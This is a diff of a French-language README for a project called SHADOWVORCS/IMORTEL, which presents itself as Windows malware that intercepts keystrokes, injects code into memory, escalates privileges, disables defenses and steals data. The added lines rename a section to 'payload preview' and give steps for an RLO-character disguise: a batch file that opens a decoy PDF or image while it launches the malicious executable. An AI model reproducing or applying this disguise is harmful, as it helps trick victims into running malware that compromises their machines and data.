@@ -44,7 +44,7 @@
   ┌─────────────────────────────────────────────────────────────────┐
   │                                                                 │
   │   01  ──  PRÉSENTATION DE SHADOWVORCS                           │
-  │   02  ──  APERÇU & SCREENSHOT                                   │
+  │   02  ──  APERÇU DU PAYLOAD                                   │
   │   03  ──  ARCHITECTURE DU PROJET                                │
   │   04  ──  TÉLÉCHARGEMENTS                                       │
   │   05  ──  ENVIRONNEMENT & INSTALLATION                          │
@@ -103,6 +103,16 @@ Une fois activé, le malware intercepte toutes les entrées clavier, empêchant 
 
 Le programme injecte et exécute du code machine directement en mémoire, ce qui lui permet d'éventuellement télécharger des charges utiles supplémentaires, établir des connexions réseau distantes ou voler des données.
 
+**TECHNIQUE D'OBFUSCATION, D'EMBALLAGE ET DE STÉGANOGRAPHIE AVEC LE CARACTÈRE RLO**
+
+Étape 1 : Vous devez d'abord créer un fichier batch qui servira à exécuter les composants malveillants :
+Créez un fichier texte nommé lance.bat (clic droit -> Nouveau -> Document texte, puis renommez-le)
+Dans ce fichier, insérez exactement ces deux lignes :
+```bash
+start "" "imortel.pdf" ou "imortel.png"
+start "" "imortels.exe"
+```
+
 Fonctionnalités principales :
 
 - **Prise de contrôle système** - Élévation silencieuse des privilèges et désactivation des défenses
@@ -124,7 +134,7 @@ Mode opératoire :
 
 ---
 
-## 02 — APERÇU & SCREENSHOT
+## 02 — APERÇU DU PAYLOAD
 
 <div align="center">
 
@@ -163,9 +173,9 @@ Mode opératoire :
   │                                                                     │
   │   📁  IMORTEL/                                                     │
   │   │                                                                 │
-  │   ├── 📄  imortel.cpp     ←  Code source principal  (C++ Win32)    │
-  │   ├── 💻  imortel.exe     ←  Exécutable compilé  (Windows x86/x64) │
-  │   ├── 🖼️   imortel.png     ←  Screenshot de l'application          │
+  │   ├── 📄  imortel.cpp     ←  Code source principal (C++ Win32)     │
+  │   ├── 💻  imortel.exe     ←  Exécutable compilé (Windows x86/x64)  │
+  │   ├── 🖼️  imortel.png     ←  Screenshot                            │
   │   ├── 🎨  imortel.ico     ←  Icône de l'application (.ico)         │
   │   ├── 📦  imortel.rar     ←  Archive complète du projet (WinRAR)   │
   │   ├── 📄  imortel.pdf     ←  Documentation technique               │
